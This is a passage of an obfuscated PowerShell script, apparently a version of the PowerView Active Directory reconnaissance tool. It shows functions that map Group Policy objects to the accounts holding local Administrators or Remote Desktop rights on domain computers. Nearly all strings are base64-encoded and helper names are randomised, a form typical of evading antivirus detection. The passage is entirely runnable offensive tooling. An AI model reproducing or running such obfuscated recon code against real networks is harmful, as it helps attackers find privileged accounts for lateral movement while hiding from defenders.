        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${c439d88584a145d3942e91b51e127dfe} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            ${c439d88584a145d3942e91b51e127dfe} += dc2f41a670d5455b8f64f106e1b09449 @4d9045c4da1f4e51877c33724d2fe187 -Identity $Identity | Select-Object -Expand objectsid
            ${2ce3c380076b478daf0cc045aab623bf} = ${c439d88584a145d3942e91b51e127dfe}
            if (-not ${c439d88584a145d3942e91b51e127dfe}) {
                Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAFMASQBEACAAZgBvAHIAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
            }
        }
        else {
            ${c439d88584a145d3942e91b51e127dfe} = @('*')
        }
        if ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            ${63405e6b09f9445187b69ddb60b4e7ae} = $LocalGroup
        }
        elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            ${63405e6b09f9445187b69ddb60b4e7ae} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
            ${63405e6b09f9445187b69ddb60b4e7ae} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if (${c439d88584a145d3942e91b51e127dfe}[0] -ne '*') {
            ForEach (${0060f067032040ef8393c187e7a9dae3} in ${c439d88584a145d3942e91b51e127dfe}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABuAGUAcwB0AGUAZAAgAGcAcgBvAHUAcAAgAG0AZQBtAGIAZQByAHMAaABpAHAAcwAgAGYAbwByADoAIAAnACQAewAwADAANgAwAGYAMAA2ADcAMAAzADIAMAA0ADAAZQBmADgAMwA5ADMAYwAxADgANwBlADcAYQA5AGQAYQBlADMAfQAnAA==')))
                ${c439d88584a145d3942e91b51e127dfe} += d174ca9e2db1482aa71d60f71b8d2690 @4d9045c4da1f4e51877c33724d2fe187 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -e2fd4901292b4e7b9d4aa82603ed80a7 ${0060f067032040ef8393c187e7a9dae3} | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABUAGEAcgBnAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABTAEkARAA6ACAAJAB7ADYAMwA0ADAANQBlADYAYgAwADkAZgA5ADQANAA1ADEAOAA3AGIANgA5AGQAZABiADYAMABiADQAZQA3AGEAZQB9AA==')))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAGYAZgBlAGMAdABpAHYAZQAgAHQAYQByAGcAZQB0ACAAZABvAG0AYQBpAG4AIABTAEkARABzADoAIAAkAHsAYwA0ADMAOQBkADgAOAA1ADgANABhADEANAA1AGQAMwA5ADQAMgBlADkAMQBiADUAMQBlADEAMgA3AGQAZgBlAH0A')))
        ${9036b0e48a214b2ea77891d10a9cfe86} = a9db526398874ca7a902327326f1bcab @4d9045c4da1f4e51877c33724d2fe187 -cc09c1f12e1d411c94e08ab90554f3fd | ForEach-Object {
            ${51bfe0eb07c040518024bb4ab78efb12} = $_
            if (${51bfe0eb07c040518024bb4ab78efb12}.GroupSID -match ${63405e6b09f9445187b69ddb60b4e7ae}) {
                ${51bfe0eb07c040518024bb4ab78efb12}.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( (${c439d88584a145d3942e91b51e127dfe}[0] -eq '*') -or (${c439d88584a145d3942e91b51e127dfe} -Contains $_) ) {
                        ${51bfe0eb07c040518024bb4ab78efb12}
                    }
                }
            }
            if ( (${51bfe0eb07c040518024bb4ab78efb12}.GroupMemberOf -contains ${63405e6b09f9445187b69ddb60b4e7ae}) ) {
                if ( (${c439d88584a145d3942e91b51e127dfe}[0] -eq '*') -or (${c439d88584a145d3942e91b51e127dfe} -Contains ${51bfe0eb07c040518024bb4ab78efb12}.GroupSID) ) {
                    ${51bfe0eb07c040518024bb4ab78efb12}
                }
            }
        } | Sort-Object -Property GPOName -Unique
        ${9036b0e48a214b2ea77891d10a9cfe86} | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            ${bbc71b57f4294bff8175817d927b3e2e} = $_.GPOName
            ${096f798288ee42bbabdfef84193da5b8} = $_.GPOPath
            ${6419cd5c3e9a452ebac1c1c886fd184b} = $_.GPOType
            if ($_.GroupMembers) {
                ${7205996ae3fc4853af5ef4f238e1f39d} = $_.GroupMembers
            }
            else {
                ${7205996ae3fc4853af5ef4f238e1f39d} = $_.GroupSID
            }
            ${240db24f27734345ae79965d51b220ef} = $_.Filters
            if (${c439d88584a145d3942e91b51e127dfe}[0] -eq '*') {
                ${87839022d1fa4f90add28908827c6aa8} = ${7205996ae3fc4853af5ef4f238e1f39d}
            }
            else {
                ${87839022d1fa4f90add28908827c6aa8} = ${2ce3c380076b478daf0cc045aab623bf}
            }
            a441e23e2e174a0185672157e28acb2c @4d9045c4da1f4e51877c33724d2fe187 -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -e9af060612154816abf90079d611af3a ${bbc71b57f4294bff8175817d927b3e2e} | ForEach-Object {
                if (${240db24f27734345ae79965d51b220ef}) {
                    ${2b7f2a3d8d3a410bb3a1b85c94627ba3} = cec1def5409041f78ed8ecd436f7fa52 @4d9045c4da1f4e51877c33724d2fe187 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | Where-Object {$_.distinguishedname -match (${240db24f27734345ae79965d51b220ef}.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    ${2b7f2a3d8d3a410bb3a1b85c94627ba3} = cec1def5409041f78ed8ecd436f7fa52 @4d9045c4da1f4e51877c33724d2fe187 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if (${2b7f2a3d8d3a410bb3a1b85c94627ba3}) {
                    if (${2b7f2a3d8d3a410bb3a1b85c94627ba3} -isnot [System.Array]) {${2b7f2a3d8d3a410bb3a1b85c94627ba3} = @(${2b7f2a3d8d3a410bb3a1b85c94627ba3})}
                    ForEach (${0060f067032040ef8393c187e7a9dae3} in ${87839022d1fa4f90add28908827c6aa8}) {
                        $Object = dc2f41a670d5455b8f64f106e1b09449 @4d9045c4da1f4e51877c33724d2fe187 -Identity ${0060f067032040ef8393c187e7a9dae3} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                        ${b464a468ca1849449cb85f2df6b95829} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${6e372186b10a4609b7af207a4719260a} = New-Object PSObject
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${b464a468ca1849449cb85f2df6b95829}
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${bbc71b57f4294bff8175817d927b3e2e}
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${096f798288ee42bbabdfef84193da5b8}
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${6419cd5c3e9a452ebac1c1c886fd184b}
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.Properties.distinguishedname
                        ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${2b7f2a3d8d3a410bb3a1b85c94627ba3}
                        ${6e372186b10a4609b7af207a4719260a}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                        ${6e372186b10a4609b7af207a4719260a}
                    }
                }
            }
            da03d47a936449b487ea369a2ced591f @4d9045c4da1f4e51877c33724d2fe187 -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -e9af060612154816abf90079d611af3a ${bbc71b57f4294bff8175817d927b3e2e} | ForEach-Object {
                ForEach (${0060f067032040ef8393c187e7a9dae3} in ${87839022d1fa4f90add28908827c6aa8}) {
                    $Object = dc2f41a670d5455b8f64f106e1b09449 @4d9045c4da1f4e51877c33724d2fe187 -Identity ${0060f067032040ef8393c187e7a9dae3} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    ${b464a468ca1849449cb85f2df6b95829} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    ${6e372186b10a4609b7af207a4719260a} = New-Object PSObject
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${b464a468ca1849449cb85f2df6b95829}
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${bbc71b57f4294bff8175817d927b3e2e}
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${096f798288ee42bbabdfef84193da5b8}
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${6419cd5c3e9a452ebac1c1c886fd184b}
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    ${6e372186b10a4609b7af207a4719260a} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                    ${6e372186b10a4609b7af207a4719260a}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                    ${6e372186b10a4609b7af207a4719260a}
                }
            }
        }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${bf90b228420f4b8eb6904571ce2a00df},
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${4d9045c4da1f4e51877c33724d2fe187} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            ${f40bbd80bd6c43d793ec0eee353f8015} = cec1def5409041f78ed8ecd436f7fa52 @4d9045c4da1f4e51877c33724d2fe187 -Identity ${bf90b228420f4b8eb6904571ce2a00df} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not ${f40bbd80bd6c43d793ec0eee353f8015}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAEMAbwBtAHAAdQB0AGUAcgBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcAXQAgAEMAbwBtAHAAdQB0AGUAcgAgACQAewBiAGYAOQAwAGIAMgAyADgANAAyADAAZgA0AGIAOABlAGIANgA5ADAANAA1ADcAMQBjAGUAMgBhADAAMABkAGYAfQAgAG4AbwB0ACAAZgBvAHUAbgBkAC4AIABUAHIAeQAgAGEAIABmAHUAbABsAHkAIABxAHUAYQBsAGkAZgBpAGUAZAAgAGgAbwBzAHQAIABuAGEAbQBlAC4A')))
            }
            ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${f40bbd80bd6c43d793ec0eee353f8015}) {
                ${44b483616d244010b4a4fd58d96b0cff} = @()
                ${0e64fea2836d457194968445e6b46921} = ${a9e149a622e146cb8c4c690f286bb4b0}.distinguishedname
                ${a6c28893334a43ee87750f354d3c8a33} = ${0e64fea2836d457194968445e6b46921}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))
                if (${a6c28893334a43ee87750f354d3c8a33} -gt 0) {
                    ${a44cc45a5f1643c5bc2b553dc36be0f6} = ${0e64fea2836d457194968445e6b46921}.SubString(${a6c28893334a43ee87750f354d3c8a33})
                }
                if (${a44cc45a5f1643c5bc2b553dc36be0f6}) {
                    ${44b483616d244010b4a4fd58d96b0cff} += a441e23e2e174a0185672157e28acb2c @4d9045c4da1f4e51877c33724d2fe187 -SearchBase ${a44cc45a5f1643c5bc2b553dc36be0f6} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $(${a9e149a622e146cb8c4c690f286bb4b0}.dnshostname)"
                ${83894a214ed54e198ca73dd3e40441d8} = (c738055cf72946c7a5b1df0a9dc66984 -ac645935110b4eaea96e7bf6f0b2d7f4 ${a9e149a622e146cb8c4c690f286bb4b0}.dnshostname).SiteName
                if (${83894a214ed54e198ca73dd3e40441d8} -and (${83894a214ed54e198ca73dd3e40441d8} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    ${44b483616d244010b4a4fd58d96b0cff} += da03d47a936449b487ea369a2ced591f @4d9045c4da1f4e51877c33724d2fe187 -Identity ${83894a214ed54e198ca73dd3e40441d8} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                ${44b483616d244010b4a4fd58d96b0cff} | a9db526398874ca7a902327326f1bcab @4d9045c4da1f4e51877c33724d2fe187 | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    ${51bfe0eb07c040518024bb4ab78efb12} = $_
                    if(${51bfe0eb07c040518024bb4ab78efb12}.GroupMembers) {
                        ${7205996ae3fc4853af5ef4f238e1f39d} = ${51bfe0eb07c040518024bb4ab78efb12}.GroupMembers
                    }
                    else {
                        ${7205996ae3fc4853af5ef4f238e1f39d} = ${51bfe0eb07c040518024bb4ab78efb12}.GroupSID
                    }
                    ${7205996ae3fc4853af5ef4f238e1f39d} | ForEach-Object {
                        $Object = dc2f41a670d5455b8f64f106e1b09449 @4d9045c4da1f4e51877c33724d2fe187 -Identity $_
                        ${b464a468ca1849449cb85f2df6b95829} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${9b35e64cb9294860a592006f83851e0b} = New-Object PSObject
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}.dnshostname
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${b464a468ca1849449cb85f2df6b95829}
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${51bfe0eb07c040518024bb4ab78efb12}.GPODisplayName
                        ${9b35e64cb9294860a592006f83851e0b} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${51bfe0eb07c040518024bb4ab78efb12}.GPOName
